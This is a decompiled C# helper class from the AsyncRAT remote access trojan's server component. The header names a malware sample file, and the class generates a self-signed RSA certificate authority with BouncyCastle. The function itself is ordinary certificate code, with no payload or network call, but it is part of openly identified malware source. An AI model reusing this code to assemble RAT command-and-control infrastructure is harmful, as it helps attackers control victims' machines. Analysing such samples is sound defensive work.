// Decompiled with JetBrains decompiler
// Type: Server.Helper.CreateCertificate
// Assembly: AsyncRAT, Version=0.5.7.0, Culture=neutral, PublicKeyToken=null
// MVID: 51786A10-CF9D-455B-B8A4-B82CB9EDE322
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-HackTool.MSIL.Alien.gen-bb1f2c2c9b279790b67eaea6ab0bbce3a4d4432bbe1bd716750f2f9ba3337f7e.exe

using Org.BouncyCastle.Asn1;
using Org.BouncyCastle.Asn1.X509;
using Org.BouncyCastle.Crypto;
using Org.BouncyCastle.Crypto.Generators;
using Org.BouncyCastle.Crypto.Operators;
using Org.BouncyCastle.Crypto.Parameters;
using Org.BouncyCastle.Crypto.Prng;
using Org.BouncyCastle.Math;
using Org.BouncyCastle.Security;
using Org.BouncyCastle.X509;
using Org.BouncyCastle.X509.Extension;
using System;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;

namespace Server.Helper
{
  public static class CreateCertificate
  {
    public static X509Certificate2 CreateCertificateAuthority(
      string caName,
      int keyStrength)
    {
      SecureRandom secureRandom = new SecureRandom((IRandomGenerator) new CryptoApiRandomGenerator());
      RsaKeyPairGenerator keyPairGenerator = new RsaKeyPairGenerator();
      keyPairGenerator.Init(new KeyGenerationParameters(secureRandom, keyStrength));
      AsymmetricCipherKeyPair keyPair = keyPairGenerator.GenerateKeyPair();
      X509V3CertificateGenerator certificateGenerator = new X509V3CertificateGenerator();
      X509Name x509Name = new X509Name("CN=" + caName);
      certificateGenerator.SetSerialNumber(BigInteger.ProbablePrime(120, (Random) secureRandom));
      certificateGenerator.SetSubjectDN(x509Name);
      certificateGenerator.SetIssuerDN(x509Name);
      certificateGenerator.SetNotAfter(DateTime.MaxValue);
      certificateGenerator.SetNotBefore(DateTime.UtcNow.Subtract(new TimeSpan(2, 0, 0, 0)));
      certificateGenerator.SetPublicKey(keyPair.Public);
      certificateGenerator.AddExtension(X509Extensions.SubjectKeyIdentifier, false, (Asn1Encodable) new SubjectKeyIdentifierStructure(keyPair.Public));
      certificateGenerator.AddExtension(X509Extensions.BasicConstraints, true, (Asn1Encodable) new BasicConstraints(true));
      return new X509Certificate2(DotNetUtilities.ToX509Certificate(certificateGenerator.Generate((ISignatureFactory) new Asn1SignatureFactory("SHA512WITHRSA", keyPair.Private, secureRandom))))
      {
        PrivateKey = (AsymmetricAlgorithm) DotNetUtilities.ToRSA(keyPair.Private as RsaPrivateCrtKeyParameters)
      };
    }
  }
}
